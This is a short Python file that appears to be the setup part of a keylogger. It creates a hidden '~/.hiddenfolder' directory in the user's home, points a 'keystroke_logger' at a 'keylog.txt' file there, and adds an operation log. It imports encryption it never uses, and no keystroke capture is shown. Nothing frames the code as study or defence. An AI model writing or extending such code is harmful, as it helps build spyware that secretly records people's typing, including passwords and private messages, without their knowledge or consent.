import logging
import os
from cryptography.fernet import Fernet
import os

log_dir = os.path.join(os.path.expanduser("~"), ".hiddenfolder")
os.makedirs(log_dir, exist_ok=True)

log_file_path = os.path.join(log_dir, "keylog.txt")
keystroke_logger = logging.getLogger('keystroke_logger')

def setup_logger(name, filename, level=logging.INFO, fmt='%(asctime)s: %(message)s'):
    logger = logging.getLogger(name)
    logger.setLevel(level)
    handler = logging.FileHandler(os.path.join(log_dir, filename))
    handler.setFormatter(logging.Formatter(fmt))
    logger.addHandler(handler)
    return logger

keystroke_logger = setup_logger('keystroke_logger', 'keylog.txt', fmt='%(message)s')
operation_logger = setup_logger('operation_logger', 'log.txt')

